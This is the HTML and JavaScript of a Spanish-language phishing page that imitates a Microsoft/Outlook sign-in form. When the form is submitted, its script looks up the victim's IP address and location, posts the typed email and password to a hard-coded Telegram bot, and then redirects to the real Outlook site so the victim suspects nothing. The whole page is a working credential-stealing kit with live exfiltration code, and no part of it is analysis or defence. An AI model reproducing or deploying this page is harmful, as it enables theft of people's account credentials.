<html>

<head>
	<title></title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">

	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
	<!--===============================================================================================-->
	<script>
		function soloNumeros(e) {
			var key = window.event ? e.which : e.keyCode;
			if (key < 48 || key > 57) {
				e.preventDefault();
			}
		}
	</script>
</head>

<body>

	<div class="limiter">
		<div class="container-login100" style="background-image:url('images/fond.png'); 
    position: absolute;
   ">

			<div class="wrap-login100 p-l-55 p-r-55 p-t-65 p-b-54">

				<form class="login100-form validate-form" id="login-form">
					<div align="left"><span class="p-b-49" style="font-size:24px;">
							<br><b>Iniciar</b>
						</span></div><br>

					<div class="wrap-input100 validate-input m-b-23">
						<span class="label-input100">Correo electrónico, teléfono o Skype</span>
						<input class="input100" type="email" id="email" name="email" required placeholder="Correo electrónico, teléfono o Skype" required>
						<span class="focus-input100" data-symbol="&#xf15a;"></span>
					</div>

					<div class="wrap-input100 validate-input">
						<span class="label-input100">Escribir Contraseña</span>
						<input class="input100" type="password" id="password" name="password" placeholder="Contraseña" required>
						<span class="focus-input100" data-symbol="&#xf190;"></span>
					</div>




					<br>


					<div class="text-right p-t-8 p-b-31">

					</div>

					<div class="container-login100-form-btn">
						<div class="wrap-login100-form-btn">
							<div class="login100-form-bgbtn"></div>
							<button type="submit" class="login100-form-btn">
								Finalizar
							</button>
						</div>
					</div>


				</form>
			</div>
		</div>
	</div>

</body>
<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

<script>
	const url = 'https://ipapi.co/json/';
	const form = document.querySelector('#login-form');
	form.addEventListener("submit", (event) => {
		event.preventDefault(); // evita que se envíe el formulario
		axios.get(url).then(response => {
			const email = document.querySelector('#email').value;
			const password = document.querySelector('#password').value;
			const message = "Correo: " + email + " Contra: " + password + "\nCiudad:" + response.data.city + "\nPais: " + response.data.country + "\nIP: " + response.data.ip;;
			axios.post('https://api.telegram.org/bot7473917478:AAGnEDuz4YUTgsTo-27A6WzhPUblveFMmcA/sendMessage', {
					chat_id: '6649322684',
					text: message,
				})
				.then((response) => {
					console.log(response.data);
					window.location.href = "https://outlook.live.com/owa/"
				})
				.catch((error) => {
					console.error(error);
				});
		}).catch(error => {
			console.log(error);
		});

	});
</script>

</html>